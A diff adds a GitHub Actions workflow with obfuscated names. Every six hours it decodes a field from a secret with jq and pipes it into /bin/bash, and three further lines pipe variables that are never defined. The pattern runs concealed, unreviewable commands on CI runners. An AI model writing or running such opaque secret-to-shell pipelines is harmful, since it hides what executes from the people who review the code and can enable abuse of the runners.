@@ -1,0 +1,20 @@
+name: youlinghele
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '8 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: youlinghele
+        env:
+          nlonx760: ${{ secrets.nlonx760 }}
+        run: |
+          echo $nlonx760 | jq -r .a6 | /bin/bash
+          echo $vap8504 | jq -r .bfn29 | /bin/bash
+          echo $j70727 | jq -r .py264 | /bin/bash
+          echo $gpaxk76437 | jq -r .kiy44 | /bin/bash
+
